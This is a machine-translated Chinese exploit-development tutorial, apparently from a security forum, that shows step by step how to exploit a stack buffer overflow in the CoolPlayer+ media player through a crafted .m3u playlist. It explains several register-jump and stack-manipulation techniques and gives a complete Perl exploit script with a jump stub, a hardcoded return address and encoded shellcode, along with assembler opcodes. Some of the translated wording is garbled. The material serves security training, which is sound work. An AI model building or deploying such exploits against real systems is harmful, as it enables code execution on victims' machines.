
我们已成功重定向到缓冲区的开始处。现在我们需要用一些跳转代码启动缓冲区。我们的跳转代码将执行以下操作：

将X添加到EBX，然后跳转到调整后的EBX，其中X =我们要跳转的字节数。我们应该添加多少X？

我们需要考虑260字节的偏移量和4字节的EIP。我们也想用NOPS作为目标，最好我们的跳转代码将会落在这个NOP底座的某个地方。由于在我们的EIP覆盖之后我们有足够的空间用于shellcode，因此让它以50 NOPS开头。考虑到用于覆盖EIP的四个字节，我们的NOP底座将占用我们缓冲区的字节265到315。因此，300的自定义跳转X可以跳到放在这个NOP内，并很好地流向后面的shellcode。所以，这个自定义跳转代码是什么样的？

为此，我们可以转向另一个方便的Metasploit工具，称为metasm。在kali，你可以得到它如下：

```
/usr/share/metasploit-framework/tools/metasm_shell.rb
```

这会产生一个metasm shell，您可以在其中输入汇编指令，它将返回shellcode的相关操作码。由于我们想要添加300到EBX，让我们在metasm中输入相应的Assembly命令并查看结果：

```
metasm > add ebx, 300
"\x81\xc3\x2c\x01\x00\x00"
```

结果操作码的问题是它包含NULL字节。为了避免这种情况，我们尝试一个更小的100：

```
metasm > add ebx, 100
"\x83\xc3\x64"
```

完美，没有空字节。为了使EBX增加300，我们只需要重复这个指令3次。在我们将EBX增加300之后，我们需要跳到它。使用metasm，获取`jmp ebx`的操作码如下：

```
 jmp ebx
"\xff\xe3"
```

我们的跳转代码如下所示：

```
my $jmp = "\x83\xc3\x64" x 3; # add 300 to ebx

$jmp = $jmp . "\xff\xe3"; # jmp ebx
```

让我们更新我们的漏洞利用脚本，以验证自定义跳转代码能够成功地将程序执行重定向到我们的shellcode。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_YNGH5BHSG4BNEF4.png)

参考上面的截图，你可以看到我已经添加了跳转代码。我还修改了`$junk`，以便它能够解释`$jmp`的长度，并最终得到EIP的正确偏移量（260）。我使用中断来代替实际的NOP，这样我们就可以准确地看到我们的自定义跳转代码在哪里。如果一切如预期的那样，我们应该在我们的INT指令内跳过超过我们跳转代码的300个字节。让我们来看看…

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_DXAFTW7ZG5M626U.png)

我们确切地落在了我们预期的地方。现在我们可以让NOP缓冲区变得更小，并且更接近EIP，但由于我们有空间可以玩，所以没有理由如此精确。让我们再次更新我们的漏洞利用脚本，用实际的NOP替换INT并插入一些shell代码（calc.exe）。

```
#!/usr/bin/perl

my $buffsize = 10000; # set consistent buffer size

my $jmp = "\x83\xc3\x64" x 3; # add 300 to ebx which will jump beyond eip overwrite and into nops/shellcode
$jmp = $jmp . "\xff\xe3"; # jmp ebx
my $junk = "\x41" x (260 - length($jmp)); # fill remainder of start of buffer to eip overwrite at offset 260
my $eip = pack('V',0x7c810395); # call ebx [kernel32.dll] which points to start of buffer and our jump code
# no usable application module found
my $nops = "\xcc" x 50;

# Calc.exe payload [size 227]
# msfpayload windows/exec CMD=calc.exe R |
# msfencode -e x86/shikata_ga_nai -t perl -c 1 -b '\x00\x0a\x0d\xff'
my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" .
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1" .
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" .
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" .
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b" .
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2" .
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37" .
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3" .
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef" .
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb" .
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf" .
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
"\x9a\xca\xc0";

my $sploit = $jmp.$junk.$eip.$nops.$shell; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">"$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
```

将产生的m3u文件放在C：\中，然后尝试..

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_TQ36VM9WCAJQXAN.png)

成功！！然而，这个漏洞利用仍然有限，因为它只有在从C：\打开m3u文件时才有效。这里有一个小小的练习 - 看看你是否可以通过使它在多个保存位置（桌面，我的音乐等）工作来改善它，就像我们为ASX To MP3利用做的一样。下面列出了一个可能的解决方案

[CoolPlayer + Portable v2.19.4 BOF利用](https://bbs.kanxue.com/elink@2edK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2K6k6h3y4#2M7X3W2@1P5i4y4A6k6Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5c8X3y4G2L8$3I4H3L8r3q4&6k6i4u0Q4y4h3k6W2P5s2m8D9L8$3W2@1i4K6g2X3k6r3g2E0L8#2)9J5k6i4m8D9)

## 2. sub [reg] + jmp

你可能会面临一种情况，你宁愿减少它的价值，而不是增加注册价值。

例如，在发生崩溃时，EBX仍然指向我们的缓冲区的开始处，但仅提供<100字节的不间断空间 - 没有足够的空间来托管shellcode，但有足够的空间用于某些基本跳转代码。这意味着我们可以使用EBX重定向到我们缓冲区的开始处，并执行一些针对另一个寄存器的跳转代码 - 在本例中为ESP。ESP指向我们缓冲区的一部分（从缓冲区开始总共约280字节）。问题是，在崩溃和EIP覆盖时，ESP指向缓冲区的中间而不是开始，并且没有调整ESP，我们没有足够的空间来托管我们的shellcode。为了解决这个问题，我们可以重新排列我们的缓冲区，以便将shellcode放在开始位置，以适当的值递减ESP并跳转到ESP以执行shellcode。让我们重新访问我们的CoolPlayer +漏洞并进行必要的调整。下面是崩溃时的堆栈（使用msf模式），因此您可以可视化查看我们为新缓冲区使用的空间。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_MYBMYC2MUMB8JAW.png)

我们需要将ESP减少约240个字节。再一次，使用metasm来获得相应的操作码：

```
metasm > sub esp, 100
"\x83\xec\x64"
metasm > sub esp, 40
"\x83\xec\x28"
metasm > jmp esp
"\xff\xe4"
```

这是更新的Perl脚本：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_VQYBTKT6FN8S4WJ.png)

请注意以下更改：

```
跳转代码现在将ESP减少240
Shellcode移动到缓冲区的开头（跳转代码之后）
不再需要缓冲区的垃圾部分（NOP填充任何剩余空间以抵消260）
```

您可以在执行时立即看到堆栈（为了演示目的，调用EBX INT指令来替换EBX）。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_54KV7J7SBB56RAQ.png)

这个空间足以让我们的calc shellcode很好地执行。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_XZVX3E9ZWJ39U6T.png)

## 3. jmp [reg + offset]

除了通过自定义跳转代码直接递增寄存器，您可以通过查找跳转到所需寄存器的现有指令加上其值的偏移量，让应用程序为您完成工作。我将以我们的CoolPlayer攻击为例，简单演示这种技术。比方说，EDX是唯一一个接近指向我们的缓冲区的寄存器，但不幸的是它指向一个大约距shellcode 50个字符之前的位置（这里不是这种情况，但我们将假装这个例子）。为了让我们使用EDX，我们需要增加至少50个字节来达到我们注入的代码。我们可以使用`jmp [edx + X]`指令（其中X代表大于50的数字）来完成此操作。例如，让我们搜索一个`jmp [edx + 64]`指令。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_TSRGMHEF4JUEAW8.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_VX4TH3823ZWWYFX.png)

以下是OS模块的一些结果的屏幕截图。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_3QREF7ZFH7BN2DR.png)

然后，您可以使用这些地址之一作为新的EIP覆盖。当然，你不限于64字节的增量 - 你可能需要更多或更少。您只受可用指令的限制，您可以在可用的DLL中找到这些指令。不幸的是，在这种情况下增加EDX会导致访问冲突，所以我找不到这个特定漏洞的可用地址（尽管我只尝试过一对）。无论如何，你应该牢记这一点，作为在未来的漏洞攻击中跳转到shellcode的可能方法。

## 操作栈

### 1.push [reg] + ret

操作堆栈的第一种方法是最容易理解的，因为它与发出跳转或调用指令的概念相同。让我们重新审视我们利用CALL EBX进行EIP覆盖的漏洞利用的原始版本，但让我们假设我们找不到任何可用的JMP或CALL EBX指令。或者，我们可以搜索`PUSH EBX + RET`指令集。这将有效地将EBX推到栈顶，然后立即跳转到该地址。这次您将搜索“所有模块中的所有序列”以查找可用的推式ebx + ret指令。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_ANWM66GP73KJRJ3.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_VVVBJXN2QM74QHA.png)

这会返回一些可用的结果，包括我们将用于此示例的shell32.dll中的一个。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_48K28DD7GHJU4HG.png)

如果你想验证这个地址实际上指向了一个push ebx + ret指令，只需双击它，你就会被带到Assembly指令窗口中的那个地址。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_WFRS297RG5TGPEU.png)

您必须从原始漏洞利用脚本更新的唯一东西是`$eip`的值。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_2KUKMHE3ZTNEKAT.png)

在CoolPlayer +中打开更新的m3u文件..

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_69CFQC9YPTA3UK3.png)

### 2.pop + ret

有时你没有足够的幸运来拥有一个直接指向漏洞利用缓冲区任何部分的寄存器，但是如果出现下列情况，你可能会操纵堆栈将执行流重定向到你想要的位置：

```
1.靠近堆栈顶部的地址指向您的缓冲区 
2.ESP + N指向缓冲区（其中N是通过当前ESP的字节数（4,8,12等））。
```

让我们再次使用CoolPlayer +作为例子。为了模拟这种情况，我创建了以下漏洞利用脚本：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_CJDP47WV73PJJ7A.png)

当您在CoolPlayer +（从C：\的根目录）中打开生成的m3u文件时，您应该在Immunity中看到以下内容：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_R5SDCZQJKFVVRXT.png)

我所做的是用字母'J'模拟垃圾邮件字符，以说明我们的寄存器都没有指向任何立即有用的东西。看看ESP和当前的堆栈。您可以看到堆栈中的前三个条目包含垃圾，但紧接着是指向我们的缓冲区（7C86467B）的感兴趣的地址- 它实际上是JMP ESP我策略性地放置在这个位置以模拟我们期望的回报价值的指令。请记住，这里有两种可能的情况：

```
1）地址已经存在于堆栈中，并且您需要将流重定向到它; 
2）ESP + X指向您的缓冲区，
```

在这种情况下，您可以策略性地在您的地址缓冲区，所以当ESP + X被调用时，它会重定向到你选择的地址。如果我们可以指示程序发出pop pop pop，它会从堆栈中弹出前三个地址并执行下一个地址中的指令，将流程重定向到当前直接指向我们的NOPs / shellcode的ESP。您可以使用Immunity来查找此弹出流行弹出式ret指令。为此，请重新启动CoolPlayer +（Ctrl + F2），按F9运行程序

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_GZMSG9UHVRT8RTQ.png)

在结果文本框中，您需要输入想要查找的pop pop pop指令序列。为了做到这一点，你需要知道使用哪些寄存器。当你只是在寻找一个单一的pop时，很容易（pop eax ret或pop ebx ret等），但是找到一系列可用的三个流行歌曲指令可能会带来一些猜测。某些序列比其他序列更倾向于使用，比如pop ebi，pop esi，pop ebx，但它们都依赖于加载的模块

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_GP3FXZDKSDK7BZP.png)

一部分结果如下：
